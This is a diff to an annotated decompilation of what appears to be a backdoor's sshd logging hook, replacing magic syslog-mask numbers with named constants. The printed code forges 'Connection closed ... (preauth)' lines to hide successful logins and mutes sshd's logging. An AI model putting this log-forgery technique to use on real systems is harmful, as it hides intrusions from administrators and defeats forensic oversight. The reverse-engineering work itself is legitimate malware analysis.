@@ -9,7 +9,7 @@
  * requests once logging was already squelched, when the loader flipped `global_ctx->disable_backdoor`, or when setup failed to
  * capture a valid handler/context pair, falling back to sshd's original handler. If a message already contains the literal
  * `"Connection closed by ... (preauth)"` it replays the line via `sshd_log_via_sshlogv(log_ctx_state, level, "%s", msg)` after forcing
- * syslog into mask `0xff` so sshd stays quiet. When the text instead begins with `Accepted {password|publickey} for` the hook
+ * syslog into mask `SYSLOG_MASK_ALL` so sshd stays quiet. When the text instead begins with `Accepted {password|publickey} for` the hook
  * harvests the username between `for` and `from` plus the host segment leading up to `ssh2`, copies both into scratch buffers,
  * and rebuilds `"Connection closed by ... (preauth)"` with the sanitized format strings cached in `sshd_log_ctx_t`. Both
  * rewrite paths toggle `log_squelched`, temporarily apply the payload's logmask, emit the fake line, and then restore sshd's
@@ -125,10 +125,10 @@ void mm_log_handler_hide_auth_success_hook(LogLevel level,int forced,char *msg,v
     }
     prefix_chunk0 = CONCAT62((prefix_chunk0 >> 16),*(u16 *)log_ctx_state->fmt_percent_s);
     log_ctx_state->log_squelched = TRUE;
-    // AutoDoc: Temporarily force `setlogmask(0xff)` whenever syslog suppression is enabled so sshd's own handler stays quiet while we inject a sanitized line.
+    // AutoDoc: Temporarily force `setlogmask(SYSLOG_MASK_ALL)` whenever syslog suppression is enabled so sshd's own handler stays quiet while we inject a sanitized line.
     if (((log_ctx_state->syslog_mask_applied != FALSE) && (libc_imports != 0)) &&
        (*(code **)(libc_imports + 0x58) != (code *)0x0)) {
-      (**(code **)(libc_imports + 0x58))(0xff);
+      (**(code **)(libc_imports + 0x58))(SYSLOG_MASK_ALL);
     }
     // AutoDoc: Replay already sanitised "Connection closed" lines through `sshd_log_via_sshlogv(log_ctx_state, level, "%s", msg)` so syslog stays muted.
     sshd_log_via_sshlogv(log_ctx_state,level,(char *)&prefix_chunk0,msg);
@@ -208,7 +208,7 @@ LAB_0010a504:
     log_ctx_state->log_squelched = TRUE;
     if (((log_ctx_state->syslog_mask_applied != FALSE) && (libc_imports != 0)) &&
        (*(code **)(libc_imports + 0x58) != (code *)0x0)) {
-      (**(code **)(libc_imports + 0x58))(0xff);
+      (**(code **)(libc_imports + 0x58))(SYSLOG_MASK_ALL);
     }
     // AutoDoc: Emit the forged disconnect message with the cached user/host fragments so sshd sees only the redacted string.
     sshd_log_via_sshlogv(log_ctx_state,SYSLOG_LEVEL_INFO,(char *)&prefix_chunk0,&user_fragment_chunk0,&filtered_host_chunk0);
@@ -224,7 +224,7 @@ joined_r0x0010a4c2:
       return;
     }
     // AutoDoc: Restore sshd's original syslog mask after the sanitized message has been emitted.
-    (**(code **)(libc_imports + 0x58))(0x80000000);
+    (**(code **)(libc_imports + 0x58))(SYSLOG_MASK_SILENCE);
     return;
   }
 LAB_0010a6da:
